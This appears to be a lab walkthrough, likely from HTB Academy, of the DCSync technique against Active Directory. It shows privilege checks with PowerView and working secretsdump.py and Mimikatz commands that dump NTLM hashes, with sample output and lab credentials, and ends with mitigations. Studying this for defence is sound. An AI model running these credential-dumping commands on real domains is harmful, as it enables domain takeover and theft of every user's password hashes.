## Overview

DCSync is a powerful attack technique used to extract password hashes from Active Directory (AD) by impersonating a domain controller. This method exploits the Directory Replication Service Remote Protocol to request replication of user credentials, allowing attackers to retrieve NTLM password hashes.

## Scenario Setup

This section outlines how to leverage DCSync for full domain compromise using both Linux and Windows attack hosts. The following hosts will be used:

- **Windows Attack Host** (MS01): Accessible via RDP with `htb-student:Academy_student_AD!`
- **Linux Attack Host**: Accessible via SSH from MS01 with `htb-student:HTB_@cademy_stdnt!`
- **Target Domain Controller**: `INLANEFREIGHT.LOCAL`

## Understanding DCSync

DCSync requires control over an account with **domain replication privileges**, specifically `DS-Replication-Get-Changes-All`. Typically, Domain Admins and Enterprise Admins have these privileges by default. However, other accounts may be granted these rights, making them valuable targets.

## Checking User Privileges

We first verify if our compromised user `adunn` has the necessary permissions.

### Viewing `adunn`'s Group Membership

```powershell
Get-DomainUser -Identity adunn | select samaccountname, objectsid, memberof, useraccountcontrol | fl
```

### Checking Replication Rights

```powershell
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | 
? { ($_.ObjectAceType -match 'Replication-Get') } | 
? { $_.SecurityIdentifier -match $sid } | 
select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl
```

If `DS-Replication-Get-Changes-All` appears in the output, `adunn` has the required privileges.

## Executing the DCSync Attack

DCSync can be executed using **Impacketâ€™s secretsdump.py** or **Mimikatz**.

### Using `secretsdump.py` (Linux)

```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

#### Example Output:

```
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
```

To target a specific user:

```bash
secretsdump.py -just-dc-user administrator INLANEFREIGHT/adunn@172.16.5.5
```

### Using Mimikatz (Windows)

#### Run as `adunn`:

```cmd
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

#### Execute DCSync:

```powershell
mimikatz.exe
privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

#### Example Output:

```
SAM Username         : administrator
Hash NTLM           : 88ad09182de639ccc6579eb0849751cf
```

## Additional Enumeration

If password history is needed:

```bash
secretsdump.py -history -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

To check password last set dates:

```powershell
Get-ADUser -Filter * -Properties PwdLastSet | select SamAccountName, PwdLastSet
```

## Mitigation Strategies

1. **Restrict Replication Privileges**: Limit `DS-Replication-Get-Changes-All` to only domain controllers.
2. **Enable Monitoring & Logging**:
    - Use **Event ID 4662** (Audit Directory Service Access) to detect abnormal replication requests.
    - Monitor **Event ID 4742** (user account changes) for privilege escalation attempts.
3. **Implement the Principle of Least Privilege (PoLP)**: Ensure only necessary users have replication rights.
4. **Use Managed Service Accounts**: Replace regular user accounts for sensitive operations.
5. **Enable LAPS (Local Administrator Password Solution)**: Prevent local admin credential reuse.

## Conclusion

DCSync is a critical attack vector that can lead to full domain compromise. Understanding detection and mitigation strategies is essential to securing Active Directory environments. By proactively auditing privileges and monitoring replication requests, organizations can significantly reduce their risk exposure.
